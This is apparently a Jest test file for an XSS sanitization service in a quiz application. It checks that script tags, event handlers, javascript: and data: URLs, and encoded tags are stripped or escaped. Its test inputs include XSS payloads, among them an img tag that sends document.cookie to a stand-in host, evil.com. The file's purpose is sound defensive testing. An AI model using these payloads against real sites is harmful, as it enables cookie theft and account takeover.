/**
 * Input Sanitization Service Tests
 * 
 * Tests for XSS prevention and input sanitization
 * Requirements: 9.8 - THE System SHALL validate all WebSocket messages for proper format and authorization
 */

import { inputSanitizationService } from '../input-sanitization.service';

describe('InputSanitizationService', () => {
  describe('sanitize', () => {
    describe('basic sanitization', () => {
      it('should return empty string for null input', () => {
        expect(inputSanitizationService.sanitize(null)).toBe('');
      });

      it('should return empty string for undefined input', () => {
        expect(inputSanitizationService.sanitize(undefined)).toBe('');
      });

      it('should trim whitespace by default', () => {
        expect(inputSanitizationService.sanitize('  hello world  ')).toBe('hello world');
      });

      it('should preserve normal text', () => {
        expect(inputSanitizationService.sanitize('Hello World')).toBe('Hello World');
      });

      it('should convert non-string values to strings', () => {
        expect(inputSanitizationService.sanitize(123 as any)).toBe('123');
      });
    });

    describe('XSS prevention - script tags', () => {
      it('should remove script tags', () => {
        const input = '<script>alert("xss")</script>';
        const result = inputSanitizationService.sanitize(input);
        expect(result).not.toContain('<script>');
        expect(result).not.toContain('</script>');
        expect(result).not.toContain('alert');
      });

      it('should remove script tags with attributes', () => {
        const input = '<script type="text/javascript">alert("xss")</script>';
        const result = inputSanitizationService.sanitize(input);
        expect(result).not.toContain('<script');
        expect(result).not.toContain('alert');
      });

      it('should remove multiline script tags', () => {
        const input = `<script>
          var x = 1;
          alert(x);
        </script>`;
        const result = inputSanitizationService.sanitize(input);
        expect(result).not.toContain('<script');
        expect(result).not.toContain('alert');
      });

      it('should remove nested script tags', () => {
        const input = '<script><script>alert("xss")</script></script>';
        const result = inputSanitizationService.sanitize(input);
        expect(result).not.toContain('<script');
      });
    });

    describe('XSS prevention - event handlers', () => {
      it('should remove onclick handlers', () => {
        const input = '<div onclick="alert(\'xss\')">Click me</div>';
        const result = inputSanitizationService.sanitize(input);
        expect(result).not.toContain('onclick');
        expect(result).not.toContain('alert');
      });

      it('should remove onerror handlers', () => {
        const input = '<img src="x" onerror="alert(\'xss\')">';
        const result = inputSanitizationService.sanitize(input);
        expect(result).not.toContain('onerror');
        expect(result).not.toContain('alert');
      });

      it('should remove onload handlers', () => {
        const input = '<body onload="alert(\'xss\')">';
        const result = inputSanitizationService.sanitize(input);
        expect(result).not.toContain('onload');
      });

      it('should remove onmouseover handlers', () => {
        const input = '<a onmouseover="alert(\'xss\')">Hover me</a>';
        const result = inputSanitizationService.sanitize(input);
        expect(result).not.toContain('onmouseover');
      });
    });

    describe('XSS prevention - javascript URLs', () => {
      it('should remove javascript: URLs', () => {
        const input = '<a href="javascript:alert(\'xss\')">Click</a>';
        const result = inputSanitizationService.sanitize(input);
        expect(result).not.toContain('javascript:');
      });

      it('should remove javascript: URLs with spaces', () => {
        const input = '<a href="  javascript:alert(\'xss\')">Click</a>';
        const result = inputSanitizationService.sanitize(input);
        expect(result).not.toContain('javascript:');
      });
    });

    describe('XSS prevention - HTML tags', () => {
      it('should strip all HTML tags', () => {
        const input = '<div><p>Hello</p><span>World</span></div>';
        const result = inputSanitizationService.sanitize(input);
        expect(result).not.toContain('<');
        expect(result).not.toContain('>');
        expect(result).toContain('Hello');
        expect(result).toContain('World');
      });

      it('should strip img tags', () => {
        const input = '<img src="http://evil.com/steal.php?cookie=document.cookie">';
        const result = inputSanitizationService.sanitize(input);
        expect(result).not.toContain('<img');
        expect(result).not.toContain('src=');
      });

      it('should strip iframe tags', () => {
        const input = '<iframe src="http://evil.com"></iframe>';
        const result = inputSanitizationService.sanitize(input);
        expect(result).not.toContain('<iframe');
      });

      it('should strip object tags', () => {
        const input = '<object data="http://evil.com/malware.swf"></object>';
        const result = inputSanitizationService.sanitize(input);
        expect(result).not.toContain('<object');
      });

      it('should strip embed tags', () => {
        const input = '<embed src="http://evil.com/malware.swf">';
        const result = inputSanitizationService.sanitize(input);
        expect(result).not.toContain('<embed');
      });
    });

    describe('XSS prevention - HTML entity encoding', () => {
      it('should encode special characters after stripping tags', () => {
        // After stripping tags, remaining < and > are encoded
        const input = 'Math: 5 < 10';
        const result = inputSanitizationService.sanitize(input, { stripHtml: false });
        expect(result).toContain('&lt;');
      });

      it('should encode ampersand', () => {
        const input = 'Tom & Jerry';
        const result = inputSanitizationService.sanitize(input);
        expect(result).toContain('&amp;');
      });

      it('should encode quotes', () => {
        const input = 'He said "hello"';
        const result = inputSanitizationService.sanitize(input);
        expect(result).toContain('&quot;');
      });

      it('should encode single quotes', () => {
        const input = "It's a test";
        const result = inputSanitizationService.sanitize(input);
        expect(result).toContain('&#x27;');
      });
    });

    describe('XSS prevention - encoded attacks', () => {
      it('should handle HTML-encoded script tags by stripping them', () => {
        // The service decodes HTML entities first, then strips the resulting tags
        const input = '&lt;script&gt;alert("xss")&lt;/script&gt;';
        const result = inputSanitizationService.sanitize(input);
        // Script tags are stripped, but the text content "alert" remains (harmless as text)
        expect(result).not.toContain('<script>');
        expect(result).not.toContain('</script>');
      });

      it('should handle numeric HTML entities by stripping decoded tags', () => {
        const input = '&#60;script&#62;alert("xss")&#60;/script&#62;';
        const result = inputSanitizationService.sanitize(input);
        // Script tags are stripped after decoding
        expect(result).not.toContain('<script>');
        expect(result).not.toContain('</script>');
      });

      it('should handle hex HTML entities by stripping decoded tags', () => {
        const input = '&#x3c;script&#x3e;alert("xss")&#x3c;/script&#x3e;';
        const result = inputSanitizationService.sanitize(input);
        // Script tags are stripped after decoding
        expect(result).not.toContain('<script>');
        expect(result).not.toContain('</script>');
      });
    });

    describe('XSS prevention - data URLs', () => {
      it('should remove data:text/html URLs', () => {
        const input = '<a href="data:text/html,<script>alert(1)</script>">Click</a>';
        const result = inputSanitizationService.sanitize(input);
        expect(result).not.toContain('data:');
      });
    });

    describe('XSS prevention - CSS expressions', () => {
      it('should remove CSS expression()', () => {
        const input = '<div style="width: expression(alert(1))">Test</div>';
        const result = inputSanitizationService.sanitize(input);
        expect(result).not.toContain('expression');
      });
    });

    describe('control characters', () => {
      it('should remove null bytes', () => {
        const input = 'Hello\x00World';
        const result = inputSanitizationService.sanitize(input);
        expect(result).toBe('HelloWorld');
      });

      it('should remove other control characters', () => {
        const input = 'Hello\x01\x02\x03World';
        const result = inputSanitizationService.sanitize(input);
        expect(result).toBe('HelloWorld');
      });
    });

    describe('options', () => {
      it('should respect maxLength option', () => {
        const input = 'This is a very long string that should be truncated';
        const result = inputSanitizationService.sanitize(input, { maxLength: 10 });
        expect(result.length).toBe(10);
      });

      it('should respect normalizeWhitespace option', () => {
        const input = 'Hello    World';
        const result = inputSanitizationService.sanitize(input, { normalizeWhitespace: true });
        expect(result).toBe('Hello World');
      });

      it('should respect allowNewlines option', () => {
        const input = 'Hello\nWorld';
        const result = inputSanitizationService.sanitize(input, { allowNewlines: false });
        expect(result).not.toContain('\n');
      });

      it('should preserve newlines when allowNewlines is true', () => {
        const input = 'Hello\nWorld';
        const result = inputSanitizationService.sanitize(input, { allowNewlines: true });
        expect(result).toContain('\n');
      });
    });
  });

  describe('specific field sanitizers', () => {
    describe('sanitizeQuizTitle', () => {
      it('should sanitize quiz titles', () => {
        const input = '<script>alert("xss")</script>My Quiz';
        const result = inputSanitizationService.sanitizeQuizTitle(input);
        expect(result).not.toContain('<script>');
        expect(result).toContain('My Quiz');
      });

      it('should truncate to 200 characters', () => {
        const input = 'A'.repeat(300);
        const result = inputSanitizationService.sanitizeQuizTitle(input);
        expect(result.length).toBe(200);
      });

      it('should not allow newlines', () => {
        const input = 'Quiz\nTitle';
        const result = inputSanitizationService.sanitizeQuizTitle(input);
        expect(result).not.toContain('\n');
      });
    });

    describe('sanitizeQuizDescription', () => {
      it('should sanitize quiz descriptions', () => {
        const input = '<img src=x onerror=alert(1)>Description';
        const result = inputSanitizationService.sanitizeQuizDescription(input);
        expect(result).not.toContain('<img');
        expect(result).not.toContain('onerror');
      });

      it('should truncate to 1000 characters', () => {
        const input = 'A'.repeat(1500);
        const result = inputSanitizationService.sanitizeQuizDescription(input);
        expect(result.length).toBe(1000);
      });

      it('should allow newlines', () => {
        const input = 'Line 1\nLine 2';
        const result = inputSanitizationService.sanitizeQuizDescription(input);
        expect(result).toContain('\n');
      });
    });

    describe('sanitizeQuestionText', () => {
      it('should sanitize question text', () => {
        const input = '<script>steal()</script>What is 2+2?';
        const result = inputSanitizationService.sanitizeQuestionText(input);
        expect(result).not.toContain('<script>');
        expect(result).toContain('What is 2+2?');
      });

      it('should truncate to 1000 characters', () => {
        const input = 'Q'.repeat(1500);
        const result = inputSanitizationService.sanitizeQuestionText(input);
        expect(result.length).toBe(1000);
      });
    });

    describe('sanitizeOptionText', () => {
      it('should sanitize option text', () => {
        const input = '<b onclick="hack()">Option A</b>';
        const result = inputSanitizationService.sanitizeOptionText(input);
        expect(result).not.toContain('<b');
        expect(result).not.toContain('onclick');
      });

      it('should truncate to 500 characters', () => {
        const input = 'O'.repeat(600);
        const result = inputSanitizationService.sanitizeOptionText(input);
        expect(result.length).toBe(500);
      });

      it('should not allow newlines', () => {
        const input = 'Option\nA';
        const result = inputSanitizationService.sanitizeOptionText(input);
        expect(result).not.toContain('\n');
      });
    });

    describe('sanitizeNickname', () => {
      it('should sanitize nicknames', () => {
        const input = '<script>alert(1)</script>Player1';
        const result = inputSanitizationService.sanitizeNickname(input);
        expect(result).not.toContain('<script>');
        expect(result).toContain('Player1');
      });

      it('should truncate to 20 characters', () => {
        const input = 'VeryLongNicknameThatExceedsLimit';
        const result = inputSanitizationService.sanitizeNickname(input);
        expect(result.length).toBe(20);
      });

      it('should not allow newlines', () => {
        const input = 'Player\n1';
        const result = inputSanitizationService.sanitizeNickname(input);
        expect(result).not.toContain('\n');
      });
    });

    describe('sanitizeExplanationText', () => {
      it('should sanitize explanation text', () => {
        const input = '<iframe src="evil.com"></iframe>The answer is 4';
        const result = inputSanitizationService.sanitizeExplanationText(input);
        expect(result).not.toContain('<iframe');
        expect(result).toContain('The answer is 4');
      });

      it('should truncate to 2000 characters', () => {
        const input = 'E'.repeat(2500);
        const result = inputSanitizationService.sanitizeExplanationText(input);
        expect(result.length).toBe(2000);
      });
    });

    describe('sanitizeSpeakerNotes', () => {
      it('should sanitize speaker notes', () => {
        const input = '<script>document.cookie</script>Remember to explain';
        const result = inputSanitizationService.sanitizeSpeakerNotes(input);
        expect(result).not.toContain('<script>');
        expect(result).toContain('Remember to explain');
      });

      it('should truncate to 2000 characters', () => {
        const input = 'N'.repeat(2500);
        const result = inputSanitizationService.sanitizeSpeakerNotes(input);
        expect(result.length).toBe(2000);
      });
    });

    describe('sanitizeAnswerText', () => {
      it('should sanitize answer text', () => {
        const input = '<script>alert(1)</script>My answer is...';
        const result = inputSanitizationService.sanitizeAnswerText(input);
        expect(result).not.toContain('<script>');
        expect(result).toContain('My answer is...');
      });

      it('should truncate to 5000 characters', () => {
        const input = 'A'.repeat(6000);
        const result = inputSanitizationService.sanitizeAnswerText(input);
        expect(result.length).toBe(5000);
      });
    });
  });

  describe('sanitizeQuiz', () => {
    it('should sanitize all text fields in a quiz object', () => {
      const quiz = {
        title: '<script>alert(1)</script>My Quiz',
        description: '<img onerror=alert(1)>Description',
        questions: [
          {
            questionText: '<b onclick=hack()>Question 1</b>',
            explanationText: '<script>steal()</script>Explanation',
            speakerNotes: '<iframe>Notes</iframe>',
            options: [
              { optionText: '<script>x</script>Option A' },
              { optionText: '<script>y</script>Option B' },
            ],
          },
        ],
      };

      const result = inputSanitizationService.sanitizeQuiz(quiz);

      expect(result.title).not.toContain('<script>');
      expect(result.description).not.toContain('<img');
      expect(result.questions![0].questionText).not.toContain('<b');
      expect(result.questions![0].explanationText).not.toContain('<script>');
      expect(result.questions![0].speakerNotes).not.toContain('<iframe>');
      expect(result.questions![0].options![0].optionText).not.toContain('<script>');
      expect(result.questions![0].options![1].optionText).not.toContain('<script>');
    });

    it('should preserve non-text fields', () => {
      const quiz = {
        title: 'My Quiz',
        quizType: 'REGULAR',
        branding: { primaryColor: '#275249' },
      };

      const result = inputSanitizationService.sanitizeQuiz(quiz as any);

      expect(result.quizType).toBe('REGULAR');
      expect(result.branding).toEqual({ primaryColor: '#275249' });
    });
  });

  describe('sanitizeQuestion', () => {
    it('should sanitize all text fields in a question object', () => {
      const question = {
        questionText: '<script>alert(1)</script>What is 2+2?',
        explanationText: '<img onerror=x>The answer is 4',
        speakerNotes: '<iframe>Remember this</iframe>',
        options: [
          { optionText: '<b onclick=x>4</b>' },
          { optionText: '<script>5</script>' },
        ],
      };

      const result = inputSanitizationService.sanitizeQuestion(question);

      expect(result.questionText).not.toContain('<script>');
      expect(result.questionText).toContain('What is 2+2?');
      expect(result.explanationText).not.toContain('<img');
      expect(result.speakerNotes).not.toContain('<iframe>');
      expect(result.options![0].optionText).not.toContain('<b');
      expect(result.options![1].optionText).not.toContain('<script>');
    });
  });

  describe('containsDangerousContent', () => {
    it('should detect script tags', () => {
      expect(inputSanitizationService.containsDangerousContent('<script>alert(1)</script>')).toBe(true);
    });

    it('should detect event handlers', () => {
      expect(inputSanitizationService.containsDangerousContent('<div onclick="alert(1)">')).toBe(true);
    });

    it('should detect javascript URLs', () => {
      expect(inputSanitizationService.containsDangerousContent('javascript:alert(1)')).toBe(true);
    });

    it('should detect HTML tags', () => {
      expect(inputSanitizationService.containsDangerousContent('<img src="x">')).toBe(true);
    });

    it('should return false for safe content', () => {
      expect(inputSanitizationService.containsDangerousContent('Hello World')).toBe(false);
    });

    it('should return false for null/undefined', () => {
      expect(inputSanitizationService.containsDangerousContent(null)).toBe(false);
      expect(inputSanitizationService.containsDangerousContent(undefined)).toBe(false);
    });
  });
});
